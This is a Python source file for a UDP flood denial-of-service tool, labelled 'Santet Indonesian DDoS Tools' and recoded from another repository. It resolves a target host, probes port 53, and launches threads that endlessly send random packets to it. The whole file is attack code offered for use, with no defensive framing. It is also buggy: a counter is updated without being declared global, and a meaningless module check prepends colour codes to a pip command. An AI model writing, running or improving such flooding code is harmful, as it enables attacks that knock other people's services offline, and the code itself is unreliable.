#Santet Indonesian DDoS Tools
#This method i recode from https://github.com/fooster1337/FDos/blob/master/ddos/udp.py
import socket
import threading
import os
import colorama
import random
from urllib.parse import urlparse

#Colors
red = colorama.Fore.RED
green = colorama.Fore.GREEN
reset = colorama.Fore.RESET


if ModuleNotFoundError == True:
    print("[!] Installing requirements.txt")
    os.system(red + "pip install -r requirements.txt" + reset)
else:
    pass

packet = 0

class UDP:
    def __init__(self, target, threads, timeout) -> None:
        self.target = target
        self.threads = threads
        self.timeout = timeout

        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.setsockopt(socket.IPPROTO_UDP, socket.SO_REUSEADDR, 1)
    def generate_random(self):
        return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789") for _ in range(30))
    
    def send_packet(self, ip):
        while True:
            try:
                msg = self.generate_random()
                self.s.sendto(msg.encode(), (ip, 53))
                packet += 1
                print(green + "[+] Packet send: {0}".format(packet) + reset)
            except Exception as e:
                print(red + "Error: {0}".format(e) + reset)

    def parse_target(self):
        if "://" not in self.target:
            if self.target.startswith("http://"):
                self.target = "http://" + self.target
            elif self.target.startswith("https://"):
                self.target = "https://" + self.target
            else:
                self.target = "http://" + self.target
                
        self.target = urlparse(self.target).netloc
                
    def check_port(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 53))
            s.close()
            return True
        except ConnectionRefusedError as CRE:
            print(CRE)
        else:
            return False
        
    def attack(self):
        try:
            ip = socket.gethostbyname(self.target)
        except ConnectionError as CE:
            print(red + "Error: {0}".format(CE) + reset)
            os.system("exit")

        if self.check_port(ip):
            print(green + "[!]Port 53 in {0} is open.\n[+] Flooding Using UDP --> {0}". format(ip) + reset)
        else:
            print(red + "[!]Port 53 in {0} is closed.\nTry another host". format(ip) + reset)
        th = []
        for _ in range(int(self.threads)):
            thread = threading.Thread(target=self.send_packet, args=(ip, ))
            th.append(thread)
            thread.start()
        for i in th:
            i.join()
